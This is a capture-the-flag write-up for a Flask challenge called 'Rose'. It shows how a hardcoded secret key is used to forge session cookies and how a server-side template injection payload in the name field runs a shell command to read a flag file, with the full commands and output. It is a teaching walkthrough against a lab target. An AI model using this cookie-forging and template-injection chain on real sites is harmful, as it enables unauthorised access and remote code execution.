# Rose

# Rose

### Description

The owner of the site shut down sign ups for some reason, but we've got a backup of the code.

See if you can get access and get /home/ctf/flag.txt

[https://nessus-rose.chals.io/](https://nessus-rose.chals.io/)

[rose.zip](https://nessus.ctfd.io/files/ae8d3607deb808c4eba76a8e4205962e/rose.zip)

### Analysis

From `__init__.py` we can find the signing key for cookies:

```py
app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'
```

With this secret key we can forge any cookie. The application doesn't have any cookies, except `session`. To login we need to first know the structure of the session cookie. The easiest way (as someone who doesnt work with flask) was to replicate the environment, do signup, inspect cookie, decode and then craft payload.

Getting the cookie from replicated environment we get the session cookie.\
Using [Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager) we can decode and encode cookies.

```
└─$ flask_session_cookie_manager3.py decode -s 'SuperDuperSecureSecretKey1234!' -c '.eJwljjkSAjEMBP_imECyVof3M1uyLRcEEOwRUfwdU2Qz0xP0O21jj-Oe1nO_4pa2R09r6ixkjbJhxxxgWtUXrL3OQVCVCtVYiiuoNbfoorkI5HDj1nTEGEYdGJoRMTArlgboJMsygROYsDurYcHRKw8QLz5M5kcbpilyHbH_bX715c-Y8YzjTJ8vAswycw.ZNaLaw.But_R_GqnTeBUfdwK2CV1_pM4v8'
{'_fresh': True, '_id': 'd5638c3281d12e087b7a41bdb81d6177393be49a7078ca8ed6729602ea85cc7feff83d050c8335055719c01a364483da30865aa578191fdb5f06a9af861a37c1', '_user_id': '1', 'name': 'test'}

└─$ flask_session_cookie_manager3.py encode -s 'SuperDuperSecureSecretKey1234!' -t "{'_fresh': True, '_user_id': '1', 'name': '1337'}"                                                                    
eyJfZnJlc2giOnRydWUsIl91c2VyX2lkIjoiMSIsIm5hbWUiOiIxMzM3In0.ZNaMOQ.tS64hJBaLdncgfUYTdohzmXtMQU
```

After changing the session cookie our name get's changed to `1337`

We are able to login, now to find attack vector.

This function just screams [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

```py
@main.route('/dashboard')
@login_required
def dashboard():
    template = '''
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
'''
    return render_template_string(template)
```

### Solution

Craft session cookie with payload inside `name` and read `/home/ctf/flag.txt` (From description).

```bash
# {{
#     request.
#     application.
#     __globals__.
#     __builtins__.
#     __import__('subprocess')
#     .check_output(['cat', '/home/ctf/flag.txt'])
# }}

└─$ flask_session_cookie_manager3.py encode -s 'SuperDuperSecureSecretKey1234!' -t "{'_fresh': True, '_user_id': '1', 'name': '{{request.application.__globals__.__builtins__.__import__(\'subprocess\').check_output([\'cat\', \'/home/ctf/flag.txt\'])}}'}"
.eJwlzEEKwyAQQNGrlNmYQDB0m6uUMhg7iVITrTMDBfHuDXT3_uY3wK0SB1ikKk2AylQxvmCBO0xwuoMutlbpo8RiXSkpeicxnxZxT3l1iREvrxqTxPMf8Si5CuJgWNdSsydmM1ofyL8xqxSV4WGuj5luZg75oNnLNm_J7Va-Yp5j79B_VIg4MA.ZNaMFA.DiVZS8FzTtf4PSCUfhnOVBG5YGA
```

Change cookie:

```html
<h1 class="title">
    Welcome, b&#39;flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}\n&#39;!
</h1>
<p> The dashboard feature is currently under construction! </p> 
```

::: tip Flag
`flag{wh4ts\_1n\_a\_n4m3\_4nd\_wh4ts\_in\_y0ur\_fl4sk}`
:::
